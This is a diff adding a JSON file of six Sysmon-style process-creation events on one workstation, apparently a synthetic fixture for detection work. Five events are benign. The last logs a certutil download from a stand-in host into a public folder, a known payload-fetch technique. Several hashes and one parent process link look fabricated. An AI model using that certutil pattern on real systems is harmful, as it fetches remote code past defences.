@@ -1,0 +1,80 @@
+[
+  {
+    "EventID": 1,
+    "UtcTime": "2026-08-03T07:12:04.123Z",
+    "Computer": "WORKSTATION-01",
+    "User": "CORP\\jsmith",
+    "Image": "C:\\Windows\\explorer.exe",
+    "CommandLine": "C:\\Windows\\Explorer.EXE",
+    "ParentImage": "C:\\Windows\\System32\\userinit.exe",
+    "ParentCommandLine": "C:\\Windows\\system32\\userinit.exe",
+    "ProcessId": 3120,
+    "ParentProcessId": 700,
+    "Hashes": "SHA256=6A671B92A69755DE6FD063FCBE4BA926D83B49F78C42DBAEED8CDB6BBC57576A"
+  },
+  {
+    "EventID": 1,
+    "UtcTime": "2026-08-03T07:15:33.456Z",
+    "Computer": "WORKSTATION-01",
+    "User": "CORP\\jsmith",
+    "Image": "C:\\Windows\\System32\\notepad.exe",
+    "CommandLine": "notepad.exe C:\\Users\\jsmith\\Documents\\report.txt",
+    "ParentImage": "C:\\Windows\\explorer.exe",
+    "ParentCommandLine": "C:\\Windows\\Explorer.EXE",
+    "ProcessId": 4488,
+    "ParentProcessId": 3120,
+    "Hashes": "SHA256=B5B0A4FBB64E4F5C41946F9C67F85F27B2F56D21C893B87D76F42A5E77ABB9F1"
+  },
+  {
+    "EventID": 1,
+    "UtcTime": "2026-08-03T07:22:11.789Z",
+    "Computer": "WORKSTATION-01",
+    "User": "CORP\\jsmith",
+    "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+    "CommandLine": "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" --no-startup-window",
+    "ParentImage": "C:\\Windows\\explorer.exe",
+    "ParentCommandLine": "C:\\Windows\\Explorer.EXE",
+    "ProcessId": 5204,
+    "ParentProcessId": 3120,
+    "Hashes": "SHA256=3D2D8C9F4A1B5E7C6F8A2D4B3E9C1A5F7D2B4E6A8C3F5A7B9D1E3F5A7C9B2D4"
+  },
+  {
+    "EventID": 1,
+    "UtcTime": "2026-08-03T08:05:47.321Z",
+    "Computer": "WORKSTATION-01",
+    "User": "CORP\\jsmith",
+    "Image": "C:\\Windows\\System32\\cmd.exe",
+    "CommandLine": "cmd.exe /c dir C:\\Users\\jsmith\\Documents",
+    "ParentImage": "C:\\Windows\\explorer.exe",
+    "ParentCommandLine": "C:\\Windows\\Explorer.EXE",
+    "ProcessId": 6312,
+    "ParentProcessId": 3120,
+    "Hashes": "SHA256=C1E7A2F5D8B3E6A9C4F7B2E5A8C3F6B9D2E5A8C1F4B7E2A5C8F3B6E9A2C5F8B1"
+  },
+  {
+    "EventID": 1,
+    "UtcTime": "2026-08-03T08:31:59.654Z",
+    "Computer": "WORKSTATION-01",
+    "User": "CORP\\jsmith",
+    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "CommandLine": "powershell.exe -NoProfile -Command Get-Process",
+    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+    "ParentCommandLine": "cmd.exe /c dir C:\\Users\\jsmith\\Documents",
+    "ProcessId": 7440,
+    "ParentProcessId": 6312,
+    "Hashes": "SHA256=A9C2E5F8B1D4A7C3F6B9E2A5C8F1B4E7A3C6F9B2E5A8C1F4B7E3A6C9F2B5E8A1"
+  },
+  {
+    "EventID": 1,
+    "UtcTime": "2026-08-03T09:14:22.987Z",
+    "Computer": "WORKSTATION-01",
+    "User": "CORP\\jsmith",
+    "Image": "C:\\Windows\\System32\\certutil.exe",
+    "CommandLine": "certutil.exe -urlcache -split -f https://example.invalid/demo.txt C:\\Users\\Public\\demo.txt",
+    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+    "ParentCommandLine": "cmd.exe /K",
+    "ProcessId": 8856,
+    "ParentProcessId": 6312,
+    "Hashes": "SHA256=F3B6E9A2C5F8B1D4A7C3E6F9B2E5A8C1F4B7D3A6C9F2B5E8A1C4F7B3E6A9C2F5"
+  }
+]
